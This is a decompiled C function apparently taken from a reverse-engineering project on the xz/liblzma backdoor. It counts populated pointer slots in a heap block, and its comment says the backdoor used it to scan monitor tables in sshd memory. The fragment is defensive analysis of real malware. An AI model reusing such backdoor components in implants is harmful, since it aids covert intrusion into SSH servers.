// /home/kali/xzre-ghidra/xzregh/1074B0_count_pointers.c
// Function: count_pointers @ 0x1074B0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall count_pointers(void * * ptrs, u64 * count_out, libc_imports_t * funcs)


/*
 * AutoDoc: Uses malloc_usable_size to count populated pointer slots in a heap block without knowing the allocation size. Secret-data heuristics use it when walking monitor tables extracted from sshd memory.
 */
#include "xzre_types.h"


BOOL count_pointers(void **ptrs,u64 *count_out,libc_imports_t *funcs)

{
  BOOL BVar1;
  size_t sVar2;
  ulong uVar3;
  ulong uVar4;
  size_t i;
  size_t nWords;
  size_t blockSize;
  
  if (((ptrs == (void **)0x0) || (funcs == (libc_imports_t *)0x0)) ||
     (funcs->malloc_usable_size == (_func_17 *)0x0)) {
    return 0;
  }
  sVar2 = (*funcs->malloc_usable_size)(ptrs);
  if (sVar2 - 8 < 0x80) {
    uVar3 = 0;
    do {
      uVar4 = uVar3;
      if (ptrs[uVar3] == (void *)0x0) break;
      uVar3 = (ulong)((int)uVar3 + 1);
      uVar4 = sVar2 >> 3;
    } while (uVar3 < sVar2 >> 3);
    *count_out = uVar4;
    BVar1 = 1;
  }
  else {
    BVar1 = 0;
  }
  return BVar1;
}

